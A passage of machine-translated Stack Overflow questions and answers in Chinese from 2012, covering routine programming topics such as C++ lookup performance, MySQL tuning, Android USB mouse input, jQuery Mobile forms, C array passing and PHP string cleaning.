我正在尝试从命令行构建一个 android 应用程序（在[“Minimal”源文件中描述的一个使用 Eclipse + ADT 创建 Android 应用程序](https://stackoverflow.com/questions/11888398/minimal-source-files-to-create-android-app-using-eclipse-adt)）并且 aapt 失败并出现一些错误。如何发现我正在运行的 aapt 版本？
只有一个版本吗？
这是我正在运行的命令行：
aapt package -M AndroidManifest.xml -S res -J gen
输出不显示版本号，似乎也没有设置任何标志来显示版本。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-08T00:03:47.760

你可以试试这个解决方案：

```
aapt v 
```

# c++ - 为什么矢量和地图搜索比静态比较慢得多

> ID：13280397
> 
> 赞同：3
> 
> 时间：2012-11-08T00:01:43.460
> 
> 标签：c++, caching, optimization

我正在解析大约 1MB 大小的文件，读取前 300KB 并搜索一些特定的签名。我的策略是，对于每个字节，查看该字节是否在映射/向量/我知道可能位于签名开头的任何字节中，如果是，则查找完整签名-对于本示例，假设那些领先字节为 x37、x50 和 x52。一共处理了90个文件（实际是9个文件10次），下面的代码执行时间为2.122秒：

```
 byte * bp = &buffer[1];
        const byte * endp = buffer + bytesRead - 30; // a little buffer for optimization - no signature is that long
        //multimap<byte, vector<FileSignature> >::iterator lb, ub;
        map<byte, vector<FileSignature> >::iterator findItr;
        vector<FileSignature>::iterator intItr;
        while (++bp != endp)
        {
            if (*bp == 0x50 || *bp == 0x52 || *bp == 0x37)  // Comparison line
            {
                findItr = mapSigs.find(*bp);
                for (intItr = findItr->second.begin(); intItr != findItr->second.begin(); intItr++)
                {
                    bool bMatch = true;
                    for (UINT i = 1; i < intItr->mSignature.size(); ++i)
                    {
                        if (intItr->mSignature[i] != bp[i])
                        {
                            bMatch = false;
                            break;
                        }
                    }

                    if (bMatch)
                    {
                        CloseHandle(fileHandle);
                        return true; 
                    }
                }
            }
        } 
```

然而，我的初始实现在缓慢的 84 秒内完成。唯一的区别与上面标有“//比较行”的行有关：

```
findItr = mapSigs.find(*bp);
if (findItr != mapSigs.end())
... 
```

使用包含 3 个值的向量的非常相似的实现也会导致处理速度极慢（190 秒）：

```
if (find(vecFirstChars.begin(), vecFirstChars.end(), *bp) != vecFirstChars.end())
{
    findItr = mapSigs.find(*bp);
    ... 
```

但是直接访问向量元素的实现执行得相当好（8.1 秒）。不如静态比较好，但仍然比其他选项好得多：

```
if (vecFirstChars[0] == *bp || vecFirstChars[1] == *bp || vecFirstChars[2] == *bp)
{
    findItr = mapSigs.find(*bp);
    ... 
```

迄今为止最快的实现（受下面的组件 10 启发）如下，时间约为 2.0 秒：

```
bool validSigs[256] = {0};
validSigs[0x37] = true;
validSigs[0x50] = true;
validSigs[0x52] = true;

while (++bp != endp)
{
    if (validSigs[*bp])
    {
    ... 
```

将此扩展为使用 2 个 validSigs 来查看第 2 个字符是否有效，从而使总运行时间降低到 0.4 秒。

我觉得其他实现应该表现更好。尤其是地图，它应该随着更多签名前缀的添加而缩放，并且搜索是 O(log(n)) 与 O(n)。我错过了什么？我唯一的猜测是，通过静态比较和（在较少的情况下）矢量索引，我将用于比较的值缓存在寄存器或其他位置，这使得它比读取快得多从记忆里。如果这是真的，我是否能够明确告诉编译器将经常使用特定值？对于以下不明显的代码，我是否可以利用其他优化？

我正在使用 Visual Studio 2008 进行编译。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T00:42:15.980

这很简单，可以归结为执行的指令数量。矢量、映射或查找表将完全驻留在 CPU 1 级数据缓存中，因此内存访问不会占用时间。至于查找表，只要大多数字节不匹配签名前缀，分支预测器就会停止流量控制占用时间。（但其他结构确实会产生流量控制开销。）

很简单，依次与向量中的每个值进行比较需要 3 次比较。该映射为 O(log N)，但由于导航链接的数据结构，系数（被大 O 表示法忽略）很大。查找表是 O(1)，系数很小，因为对结构的访问可以通过一条机器指令完成，然后剩下的就是与零的比较。

分析性能的最佳方法是使用分析器工具，例如 valgrind/kcachegrind。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T03:09:58.933

“与常量比较”将 3 个内存地址与 3 个常量进行比较。如果编译器愿意，这种情况将非常容易进行展开或进行位优化等操作。书面 ASM 将在这里拥有的唯一分支将是高度可预测的。

对于文字 3 元素向量查找，取消引用向量值的地址会产生额外的成本。

对于向量循环，编译器此时不知道向量有多大。所以它必须编写一个通用循环。这个循环中有一个分支，一个分支向一个方向走 2 次，然后另一个方向。如果计算机使用启发式“分支按照上次的方式进行”，则会导致大量分支预测失败。

要验证该理论，请尝试使分支更可预测——一次搜索每个元素最多 100 个不同的输入字节，然后搜索下一个。这将使幼稚的分支预测在大约 98% 的时间内工作，而不是代码中的 33%。即，为签名 0 扫描 100 个（或其他）字符，然后为签名 1 扫描 100 个（或其他）字符，直到您用完签名。然后继续下一个 100 个字符的块以扫描签名。我选择 100 是因为我试图避免分支预测失败，而且我认为百分之几的分支预测失败并不是那么糟糕。:)

至于`map`解决方案，well`map`具有很高的恒定开销，因此它的速度很慢是可以预见的。a 的主要用途`map`是处理大型 n 查找，以及它们非常容易编写代码的事实。

# database-design - 支付数据库设计

> ID：13280398
> 
> 赞同：0
> 
> 时间：2012-11-08T00:01:52.707
> 
> 标签：database-design, sql-server-express

我目前正在尝试设计一种可以跟踪每月付款的会员类型数据库设计。我有几个表，一个用于跟踪成员，另一个用于跟踪 PLANTYPES（例如，个人会员加成本 25.00 美元）或员工会员加成本 15.00 美元），其中包括一个成本字段。

我还有一个 DUES 表，我试图根据分配给每个成员的计划类型来跟踪会员费。所以我的问题是，到目前为止，我有以下领域

```
DUAAMT, PAID(YES OR NO), DESC(COMMENTS),MEMID(LINKED FIELD TO MEMBERS TABLE),
PID(LINKED FIELD TO THE PLANTYPES TABLE) 
```

我无法找出正确的方法来跟踪会员当月的欠款，如果他们支付了额外费用，我将如何跟踪？

我的想法是设置一个 Credit 字段，在该字段中支付的任何额外款项都将放在该字段中，一旦到期，我将首先检查会员是否有任何现有的信用，如果没有，他们将欠当月到期的全部金额。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T00:15:14.240

会费是每月吗？

您需要定义一个事务表。

会费表将定义会费金额以及金额和到期日等内容。

每天（或每周或每月），您运行一个将事务附加到事务表的过程。这会根据会费金额调整余额。

当会员支付他的会费时，对交易表应用相反的交易，余额变为 0。如果会员多付，多付只会导致正余额。

只需获取每个成员的最新交易并按余额和日期过滤，您就可以创建显示成员余额、到期付款的成员和逾期成员的视图。

每个计划的每位成员都有 1 笔会费。每次向会员收费或付款时，您都有 1 笔交易，因此通常每月进行 2 笔交易。

所以你会有：

会费：**MemberID**，**PlanID**， DueDate

交易：**MemberID**、**TransactionID**、金额、日期、类型（会费、付款、购买）、RunningBalance

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T00:16:57.517

我将有另一个付款表（memid、amount、{balance}），我将在其中跟踪会员付款（他们可以支付 3 美元 3 次 = 9 美元，但仍然欠其余的会员费用）。

# php - Joomla 数据库内存泄漏

> ID：13280400
> 
> 赞同：1
> 
> 时间：2012-11-08T00:02:09.850
> 
> 标签：php, mysql, joomla

我的客户有一个非常大的基于 Joomla 的网站，托管在 Amazon EC2 上，内存为 1.5GB。该服务器同时托管 Apache 和 MySQL。目前数据库大小约为 250MB，网站每天的访问量约为 5000。看起来网站上存在严重的内存泄漏，因为有时 MySQL 使用了大约 99% 的 CPU 内存然后崩溃。我已经尝试优化数据库表，修改我的`.cnf`，但仍然没有任何改进。

Joomla 智能搜索使用的查找器表占用超过 100MB 的数据库大小。我禁用了智能搜索，但问题仍然存在。

朋友，请提出一些解决此问题的建议。

谢谢。

下面是 my.cnf 文件

```
[mysqld]
datadir=/var/lib/mysql
socket=/var/lib/mysql/mysql.sock

symbolic-links=0
bind-address            = 127.0.0.1

default-storage-engine=innodb
transaction-isolation    =   REPEATABLE-READ
character-set-server    =   UTF8
collation-server      =   UTF8_general_ci

max_connections         = 5000
wait_timeout            = 30
connect_timeout         = 60
#interactive_timeout     = 600
#max_connect_errors      = 1000000
#max_allowed_packet      = 10M

skip-external-locking
key_buffer_size = 384M
max_allowed_packet = 1M
table_open_cache = 512
sort_buffer_size = 2M
read_buffer_size = 2M
read_rnd_buffer_size = 8M
myisam_sort_buffer_size = 64M
thread_cache_size = 8
query_cache_size = 32M
# Try number of CPU's*2 for thread_concurrency
thread_concurrency = 8

slow_query_log
long_query_time = 2

[mysqld_safe]
log-error=/var/log/mysqld.log
myisam_sort_buffer_size = 64M 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-05T23:48:21.783

我敢打赌，你被一个流氓机器人击中了——那里有许多 SEO 蜘蛛之一，或者像 80legs 这样的工具，它可以让人们对机器人网络进行编程以执行任务——通常在他们的编程中出现错误，导致猛烈轰炸。

我永远不记得哪些 MySQL 设置占用内存一次，哪些是每个连接 - 但由于您设置为允许最多 5000 个同时连接并且一些缓冲区为 2 MB 和 8 MB，我敢打赌总内存使用量低于重负载很容易超过可用的总 ram。

您当前的设置将允许您的所有日常流量同时命中。我会把它降低到一百或更少的设置，看看是否能提供更多的稳定性。

有各种 MySQL 调谐器脚本可以帮助您发现分配过多内存的位置。

如果您在崩溃/高负载时访问日志，我会检查恶意机器人 - 我们在我们监控/控制的某些网站上一直在进行一场持续的战斗来控制它们。

您还可以检查 thread_concurrency 值 - 取决于您有多少 CPU 可用。

# android - 在android上读取原始鼠标数据

> ID：13280402
> 
> 赞同：19
> 
> 时间：2012-11-08T00:02:16.513
> 
> 标签：android, usb, mouse, mouseevent, usb-otg

在我的 Android 应用程序中，我**通过 USB-OTG 从 3DConnexion SpaceNavigator**读取值来控制[AR.Drone](https://github.com/ligi/SpaceAR.Drone)。

现在我想用鼠标做同样的事情。然而，Android 正在抓取鼠标并呈现鼠标光标。当我用鼠标的供应商和产品 ID 编写设备过滤器时，我不像 SpaceNavigator 那样得到它`(strangely, both are HID -- I get no cursor with the SpaceNavigator).`

**有没有办法在没有光标的情况下获取原始鼠标数据？**

与股票 Android 完美搭配。但我也会考虑为此更改ROM。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2016-10-13T20:07:03.083

一旦您的应用程序声明了鼠标（作为主机时的 USB HID 设备），Android 应该隐藏光标并且您可以读取原始数据。这应该适用于股票 android，但您的设备必须支持 USB 主机模式，并且需要 USB OTG 电缆来连接鼠标。

基本程序：

*   枚举设备
*   请求访问 USB 设备的权限
*   认领设备
*   从 HID 端点读取数据包
*   从数据包中解析 X 和 Y 位置、按钮点击和滚轮旋转

适用于我的示例代码（Android 5.0）：

```
UsbManager usbManager;
UsbDevice usbDevice;

private void connect() {
    this.usbManager = (UsbManager) context.getSystemService(Context.USB_SERVICE);
    HashMap<String, UsbDevice> deviceList = usbManager.getDeviceList();

    // just get the first enumerated USB device
    Iterator<UsbDevice> deviceIterator = deviceList.values().iterator();
    if (deviceIterator.hasNext()) {
        this.usbDevice = deviceIterator.next();
    }

    if (usbDevice == null) {
        Log.w(TAG, "no USB device found");
        return;
    }

    // ask for permission

    final String ACTION_USB_PERMISSION = "com.android.example.USB_PERMISSION";
    final BroadcastReceiver mUsbReceiver = new BroadcastReceiver() {

        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (ACTION_USB_PERMISSION.equals(action)) {
                synchronized (this) {
                    UsbDevice device = (UsbDevice)intent.getParcelableExtra(UsbManager.EXTRA_DEVICE);

                    if (intent.getBooleanExtra(UsbManager.EXTRA_PERMISSION_GRANTED, false)) {
                        if(device != null){
                            // call method to set up device communication
                            Log.i(TAG, "permission granted. access mouse.");

                            // repeat in a different thread
                            transfer(device);
                        }
                    }
                    else {
                        Log.d(TAG, "permission denied for device " + device);
                    }
                }
            } else if (UsbManager.ACTION_USB_DEVICE_DETACHED.equals(action)) {
                UsbDevice device = (UsbDevice)intent.getParcelableExtra(UsbManager.EXTRA_DEVICE);
                if (device != null) {
                    // TODO:
                    // call your method that cleans up and closes communication with the device
                    // usbInterface.releaseInterface();
                    // usbDeviceConnection.close();
                }
            }
        }
    };

    PendingIntent mPermissionIntent = PendingIntent.getBroadcast(context, 0, new Intent(ACTION_USB_PERMISSION), 0);
    IntentFilter filter = new IntentFilter(ACTION_USB_PERMISSION);
    context.registerReceiver(mUsbReceiver, filter);

    usbManager.requestPermission(usbDevice, mPermissionIntent);
}

private void transfer(UsbDevice device) {

    int TIMEOUT = 0;
    boolean forceClaim = true;

    // just grab the first endpoint
    UsbInterface intf = device.getInterface(0);
    UsbEndpoint endpoint = intf.getEndpoint(0);
    UsbDeviceConnection connection = this.usbManager.openDevice(device);
    connection.claimInterface(intf, forceClaim);

    byte[] bytes = new byte[endpoint.getMaxPacketSize()];

    connection.bulkTransfer(endpoint, bytes, bytes.length, TIMEOUT);

    // depending on mouse firmware and vendor the information you're looking for may
    // be in a different order or position. For some logitech devices the following 
    // is true:

    int x = (int) bytes[1];
    int y = (int) bytes[2];
    int scrollwheel = (int) bytes[3]

    // call a listener, process your data ...
} 
```

# forms - 带有条件/分支问题的 jQuery Mobile 站点示例

> ID：13280408
> 
> 赞同：4
> 
> 时间：2012-11-08T00:02:36.840
> 
> 标签：forms, jquery-mobile

我正在尝试创建一个带有分支问题的 JQM 调查——即在带有问题 1-3 的调查中，如果您在问题 1 上选择特定答案，则会在问题 1 和问题 2 之间动态添加一个问题。

更新：我做了一个尝试（[https://dl.dropbox.com/u/17841063/site2/index-c1.html#page2](https://dl.dropbox.com/u/17841063/site2/index-c1.html#page2)），通过将单选按钮的值与隐藏的 div 的名称相匹配来工作——如果有匹配，它会取消隐藏 div。现在的问题是，如果您将答案改回不会触发条件问题的选项，它不会重新隐藏。例如，在问题 A1 中单击“否”或“不确定”会导致出现问题 A2，但如果您随后在 A1 中单击“是”，A2 仍会保留...

```
<script type="text/javascript">
// Place in this array the ID of the element you want to hide
var hide=['A2','A4'];
function setOpt()
{
resetOpt(); // Call the resetOpt function. Hide some elements in the "hide" array.
for(var i=0,sel=document.getElementsByTagName('input');i<sel.length;i++)
    {
    sel[i].onchange=function()
        {

        if(this.parentNode.tagName.toLowerCase()!='div')
            resetOpt(); // Hides the elements in "hide" array when the first select element is choosen
        try
            {
            document.getElementById(this.value).style.display='';
            }
        catch(e){} ; // When the value of the element is not an element ID
        }
    }
}

window.addEventListener?window.addEventListener('load',setOpt,false):
window.attachEvent('onload',setOpt);

function resetOpt()
{
for(var i=0;i<hide.length;i++) 
    document.getElementById(hide[i]).style.display='none'; // Hide the elements in "hide" array
}
</script> 
```

以下是使用上述脚本的单选按钮：

```
 <div data-role="fieldcontain">
        <fieldset data-role="controlgroup" data-type="horizontal">
          <legend>(Question A1) A prominent accident smokes on top of the blessed reactionary?</legend>
          <input type="radio" name="aaa" id="aaa_0" value="notA2" />
          <label for="aaa_0">Yes</label>
          <input type="radio" name="aaa" id="aaa_1" value="A2" />
          <label for="aaa_1">No</label>
          <input type="radio" name="aaa" id="aaa_2" value="A2" />
          <label for="aaa_2">Unsure</label>
        </fieldset>
      </div>
     <div id="A2" data-role="fieldcontain">
        <fieldset data-role="controlgroup" data-type="horizontal">
          <legend>(Question A2) Does a married composite remainder the shallow whistle??</legend>
          <input type="radio" name="bbb" id="bbb_0" value="" />
          <label for="bbb_0">Yes</label>
          <input type="radio" name="bbb" id="bbb_1" value="" />
          <label for="bbb_1">No</label>
          <input type="radio" name="bbb" id="bbb_2" value="" />
          <label for="bbb_2">Unsure</label>
       </fieldset>
      </div> 
```

如果有人有解决这个问题的想法，或者有其他方法来做分支表格的例子，我将非常感激！

谢谢，帕特里克

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T19:55:19.833

I played around a little bit with your example, removed all your plain JavaScript and added some jQuery Mobile style script, [see working example here](http://jsfiddle.net/EgsZs/)

```
 <script>
      $("input[type='radio']").bind( "change", function(event, ui) {
        var mySelection = $('input[name=aaa]:checked').val();
        //alert(mySelection);
        if (mySelection == "A2") {
          $('#A2').removeClass('ui-hidden-accessible');
        } else {
          $('#A2').addClass('ui-hidden-accessible');
        };
      });
    </script> 
```

# sharepoint-2010 - 事件接收器停止工作

> ID：13280417
> 
> 赞同：0
> 
> 时间：2012-11-08T00:03:45.870
> 
> 标签：sharepoint-2010, sharepoint-deployment

出于某种原因，当它停止工作时，我正在处理事件接收器。我正在更新它并从 Visual Studio 2010 进行部署，它以前可以工作，但是当我在查找字段时它停止了。即使我删除了刚刚添加的部分，它也不再起作用。有任何想法吗。谢谢你。

```
 `/// An item was added.
    /// </summary>
    public override void ItemAdded(SPItemEventProperties properties)
    {
        base.ItemAdded(properties);
        string fname = Convert.ToString(properties.AfterProperties["Title"]);
        string Cdate = Convert.ToString(properties.AfterProperties["CDate"]).Substring(2, 2);
        // ---- Lookup fields ----- 
        String lookupZF = "Office";
        String ZF = Convert.ToString(properties.ListItem[lookupZF]);
        SPFieldLookupValue ZFValue = new SPFieldLookupValue(ZF);
        // ------ End of lookup fields ----- 
        string FName = fname + Cdate; // + ZFValue;

        SPSecurity.RunWithElevatedPrivileges(delegate()
                       {
                           using (SPSite site = new SPSite(properties.Web.Site.ID))
                           {
                               using (SPWeb web = site.OpenWeb())
                               {
                                   web.AllowUnsafeUpdates = true;
                                   SPList CurrentList = web.Lists[properties.ListId];
                             SPListItem Litem = CurrentList.GetItemById(properties.ListItemId);

                                   Litem["Description"] = "update working ...!";
                                   Litem["Prop No."] = FName;

                                   Litem.Update();
                                   CurrentList.Update();

                                   web.AllowUnsafeUpdates = false;
                               }
                           }
                       });
    }` 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T17:25:45.113

我建议在部署解决方案后检查是否在管理站点功能中激活了该功能。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T22:33:42.547

我不得不使用 dateTime 然后得到年份。由于某种原因，我得到了停止执行代码的空字符串或空字符串。这是有效的：

```
DateTime Cdate = DateTime.Parse(properties.ListItem["Created"].ToString());
string SDate = Cdate.Year.ToString().Substring(2, 2); 
```

# ios - 在 mapView-iOS 上叠加多个多边形

> ID：13280423
> 
> 赞同：0
> 
> 时间：2012-11-08T00:04:32.157
> 
> 标签：ios, ios6, mkmapview, mkoverlay, ios6-maps

如图所示，mapView 顶部有许多多边形。每个多边形都覆盖在其他多边形的顶部。这会导致不透明度问题，并误导用户通过参考颜色图来解释颜色。

在放置任何多边形之前，首先我想删除/清除新的多边形区域，然后添加多边形。

我希望我的问题清楚！如果没有，请告诉我。提前赞赏。

我还在下面添加了部分代码作为参考！多边形数据来自 JSON 格式的服务器，我从这些数据中获取坐标并将它们添加为每个时间戳的多边形。

```
for(bb = 0; bb < [polygonArray count]; bb++){
        coords = malloc(sizeof(CLLocationCoordinate2D) * [[polygonArray objectAtIndex:bb] count]);
        for (int a = 0;a < [[polygonArray objectAtIndex:bb] count]; a++){
            coords[a].latitude = [[[[polygonArray objectAtIndex:bb]objectAtIndex:a]objectAtIndex:0]doubleValue];
            coords[a].longitude = [[[[polygonArray objectAtIndex:bb]objectAtIndex:a]objectAtIndex:1]doubleValue];
        }
        polygon = [[MKPolygon alloc]init];
        polygon = [MKPolygon polygonWithCoordinates:coords count:[[polygonArray objectAtIndex:bb]count]];
        [previousPolygons addObject:polygon];
        [mapView addOverlay:polygon];
        }

    } 
```

![在此处输入图像描述](../Images/e48c1430c8f3dbea18d9e4c56fe847c7.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-05T03:12:56.480

唔。我有点不清楚你想做什么。如果您只是想删除一个多边形，您必须了解如何找到要删除并运行的多边形

```
[mapView removeOverlay:polygon] 
```

如果要删除所有多边形，则可以运行

```
[mapView removeOverlays:mapView.overlays] 
```

# c - 数组在一个 void 函数中改变，仍然在外面改变！为什么？（范围）

> ID：13280424
> 
> 赞同：2
> 
> 时间：2012-11-08T00:04:37.077
> 
> 标签：c, function, scope

这是排序算法的简单实现。我的问题是。数组`numbers`, 在 main 中声明和初始化。然后，我将它作为函数中的参数传递`sort`（是副本吗？）。在`sort`函数内部`numbers`，现在称为`array`（据我所知是副本）被更改（排序）。那么，为什么，调用函数后，数组发生了`numbers`变化（这就是我想要的，购买想知道为什么？？`array`范围是在`sort`，而不是`main`。

```
int main(void)
{
    int numbers[SIZE] = { 4, 15, 16, 50, 8, 23, 42, 108 };
    for (int i = 0; i < SIZE; i++)
        printf("%d ", numbers[i]);
    printf("\n");

    sort(numbers, SIZE);

    for (int i = 0; i < SIZE; i++)
        printf("%d ", numbers[i]);
    printf("\n");
    return 0;
}
void sort(int array[], int size)
{
    int swaps = 0;

    while(swaps==0)
    {
        for(int i = 0; i < size ; i++)
        {
            for(int j = i + 1; j < size ; j++)
            {
                if( array[i] > array[j] )
                {
                    // Swapping
                    int temp = array[i]; 
                    array[i] = array[j];
                    array[j] = temp;

                    swaps ++;
                }   
            }
        }
    }    
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-08T00:07:18.780

`int array[]`是一样的`int *array`。您正在传递一个指针。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T00:07:16.313

`void sort(int array[], int size)`传递对数组的引用，即您正在传递指向它的指针（正如@pst 正确指出的那样，这不是一个**确切的**术语，C 总是按值传递）-**不是数组的副本**。您所做的任何修改都会修改原始数组。

如果您不想修改原始数组，请将其复制并传递副本。

另一种（更有效的）方法是从调用者分配，并将指针传递给函数：

```
void sort(int *const array,int [] result, int size) 
```

如果您的算法不需要“就地”工作，这将特别方便。

请注意，在函数内部创建副本并将指向副本的指针作为返回值传回在技术上是可行的，但真的非常不鼓励

*   您不能在函数内分配 int[] 并返回它，因为它将超出范围
*   你可以做一个malloc，但是你必须记住从调用者函数中释放它，这很容易忘记

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-08T00:07:35.393

您已经通过引用传递了数组，因此对它的任何操作都会影响内存中的那个位置。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-11-08T00:12:40.747

在 C 中，有两种不同的方式将参数传递给函数/方法。- 传递值 - 传递指针

传递值的优点是为函数提供了一个可以被它修改的副本。缺点（对于大型对象）是由于需要复制数据而速度较慢。

由于不复制值，因此传递指针（比复制大对象）要快得多。但是如果被调用的函数修改了值，原来的变量也会改变。这有时是有意完成的（例如，在您的排序函数或返回多个值的函数中）。

**编辑：** *显然我在这里混淆了一些东西，所以我试图解决这个问题......最初我在谈论“按引用调用”和“按值调用”，但 C 实际上不支持引用。阅读评论以获取更多详细信息。*

# c++ - QTcpServer 在关闭时崩溃

> ID：13280436
> 
> 赞同：1
> 
> 时间：2012-11-08T00:05:50.860
> 
> 标签：c++, qt, crash, qtcpsocket, qtcpserver

我正在对服务器进行编程，我对服务和管理器进行了编程。当我使用 UI 服务器管理器停止服务器时，服务器会调用一个名为“stopServer()”的函数，该函数包含以下内容：

```
qDebug() << "Stopping the server...";
// Clear the vector and free the memory by deleting pointers
qDebug() << clients.size();
for(int i=0;i<clients.size();i++){
    clients.get(i)->getSocket()->flush();
    clients.get(i)->getSocket()->close();
    clients.get(i)->getSocket()->disconnectFromHost();
    clients.get(i)->getSocket()->waitForDisconnected(3);
}
clients.destroy();
// Close the server
socket_server->close();
// Stop the handler
qDebug() << "Stopped."; 
```

实际上，那个“clients”变量只是一个包含用户数据的向量，他关闭每个连接的 QTcpSocket，然后清理 clients 变量并将其重置为 0。

当我在服务器上有一个连接时（UI 管理器作为该连接之一工作），并且我尝试停止它，它会失败。我删除了那个矢量系统。它仍然无法正常工作，它没有给我任何错误，只是使应用程序崩溃。

如果您需要所有代码，请告诉我！

（对不起，我的英语不好...）

更新：如果我删除“socket_server->close()”，它可以正常工作。更新#2：似乎是指针删除的问题。想...

已解决：天哪，我是个笨蛋！socket_server 是一个空指针...我刚刚修复了它，就是这样！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T01:19:20.067

天哪，我是个笨蛋！socket_server 是一个空指针...我刚刚修复了它，就是这样！

# c++ - 获取 const 左值引用的地址是否合法？

> ID：13280437
> 
> 赞同：5
> 
> 时间：2012-11-08T00:05:55.760
> 
> 标签：c++, lvalue, rvalue

```
#include <iostream>
int foo()
{
  return 0;
}

int main()
{
  const int& a = foo();
  std::cout << &a << std::endl;
} 
```

在此代码中，`a`绑定到一个右值。获取地址是否合法？（通过法律我的意思是：在代码格式错误？我是否导致了未定义的行为？）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-08T00:16:36.850

这可以。在 C++11 中，您甚至可以这样做：

```
int&& a = foo();
a = 123; 
```

* * *

您可以考虑这样的临时工（从概念上和一般情况下）：

```
x = func(); // translated as:

auto __temporary = func();
x = __temporary;
__destruct_value_now_and_not_later(__temporary); 
```

除非`x`是引用类型的定义，否则编译器会注意到您有意引用临时值并通过删除早期销毁代码来延长其生命周期，使其成为普通变量。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-08T00:16:15.527

是的。在变量`a`超出范围之前，它捕获的临时变量是有效的。[Herb Sutter 可以更好地解释它](http://herbsutter.com/2008/01/01/gotw-88-a-candidate-for-the-most-important-const/)。

# mms - 如何开始构建可以发送/接收彩信的应用程序？

> ID：13280440
> 
> 赞同：2
> 
> 时间：2012-11-08T00:06:00.720
> 
> 标签：mms, twilio, pbx

我喜欢 Twilio，而且我知道还有很多其他不错的云通信平台，但似乎没有一个支持 MMS。

1) 有谁知道为什么支持彩信这么难？这似乎是一个明显需要支持的功能，但肯定有一些我不知道的技术限制。

2) 您需要构建什么（我从哪里开始）才能让 Web 应用程序发送/接收 MMS？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T08:41:38.010

原因之一是短信和语音使用的是通用协议，而彩信在不同运营商的技术实现不同，互通困难。

# javascript - 在另一个函数中声明一个函数的含义

> ID：13280443
> 
> 赞同：0
> 
> 时间：2012-11-08T00:06:32.700
> 
> 标签：javascript, performance, function, function-pointers

鉴于以下两个：

**方案 1**

```
function inner() {
  // a bunch of code that does stuff
}
function outer() {
  inner();
}
for(var i = 0; i < 10000; i++) {
  outer();
} 
```

**方案 2**

```
function outer() {
  function inner() {
    // a bunch of code that does stuff
  }
  inner();
}
for(var i = 0; i < 10000; i++) {
  outer();
} 
```

毫无疑问，这两种情况下的行为是相同的。但是引擎盖下有什么区别？在场景 2 中，口译员做了多少额外的工作（如果有的话）？记忆有没有影响。或者说，如果身体`inner()`变长，会增加对性能的影响吗？

请不要问“你为什么要这样做”，因为我的问题不是关于实际问题。只是试图更深入地了解 JS 函数是如何解析和表示的。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T00:10:58.260

> 但是引擎盖下有什么区别？在场景 2 中，口译员做了多少额外的工作（如果有的话）？

它完全取决于 JavaScript 引擎。（我不再称它们为“解释器”，因为它们中的许多实际上是即时编译的。）

*理论上*，引擎可能会`inner`在每次进入`outer`. 或者至少，`inner`为每次调用分配一个新的`outer`.

对于现代引擎，更可能的情况是代码*只*`inner`编译一次，然后重用，并且为每次调用创建一个新的函数对象，在`outer`不同的执行上下文中重用该代码。这种影响可以忽略不计（考虑一下您`{}`在 JavaScript 函数中编写的频率，而不用担心创建对象的影响）。当然，这就是 V8（Chrome 中的引擎）在大多数情况下所做的事情，而且几乎可以肯定大多数现代引擎所做的事情。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T00:45:34.330

有很多引擎：[http ://en.wikipedia.org/wiki/List_of_ECMAScript_engines](http://en.wikipedia.org/wiki/List_of_ECMAScript_engines)

其中一些是 JIT 编译，因此比其他在运行时解释的要快。对于 JIT 编译器（编译`inner`一次并重用），性能下降可以忽略不计，但对于解释器（解释`inner`多次）来说很明显。`inner`身体长大时更明显。

# html - 有没有办法让 IE 保存计算的网页

> ID：13280444
> 
> 赞同：0
> 
> 时间：2012-11-08T00:06:34.740
> 
> 标签：html, css, internet-explorer, save

我有一个需要保存的项目；但不能包含这样做的服务器端代码。

我已经对代码进行了结构化，以确保它没有外部库或 CSS 文件，并且可以在所有浏览器（**IE 除外**）上简单地按 CTRL+S ，并让页面看起来像它应该的样子。

然而，在 IE 中，它看起来就像默认页面，没有任何更改。

**TL;DR**：你能把计算出来的页面保存在 IE 中吗（最好是 8+，但 9+ 也可以。）

# php - 键包含括号的引用对象

> ID：13280448
> 
> 赞同：1
> 
> 时间：2012-11-08T00:06:52.900
> 
> 标签：php

我正在`print_r`对运行查询后返回的对象执行操作。这是我的`print_r`日志。

```
stdClass Object
(
    [MAX(sort_order)] => 3
) 
```

我想得到里面的值，`[MAX(sort_order)]`但我不知道如何从 php.ini 中定位它。

喜欢`$sort_order = $object->[MAX(sort_order)];`（我知道那行不通）

有谁知道我该怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T00:09:48.327

尝试在您的查询中添加`MAX(sort_order) AS max_sort_order`这个

# php - 需要php函数建议

> ID：13280451
> 
> 赞同：0
> 
> 时间：2012-11-08T00:07:13.010
> 
> 标签：php, function, strip-tags

任何建议都会有所帮助，谢谢

我正在尝试用内容清理一段 html 标签，但由于某种原因它无法正常工作

```
<?php

function cleaning($vclean)
{
$vclean = strip_tags($vclean);
$vclean = rtrim($vclean);
$vclean = trim($vclean);

$vclean = str_replace("  ", "", $vclean);
$vclean = preg_replace('/\s\s+/', ' ', $vclean);
$vclean = str_replace("'", "", $vclean);

echo "function is cleaning<br>";

}

cleaning($any_variable);

?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T00:09:25.827

这是你想要的：

```
<?php

function cleaning($vclean)
{
$vclean = strip_tags($vclean);
$vclean = rtrim($vclean);
$vclean = trim($vclean);

$vclean = str_replace("  ", "", $vclean);
$vclean = preg_replace('/\s\s+/', ' ', $vclean);
$vclean = str_replace("'", "", $vclean);

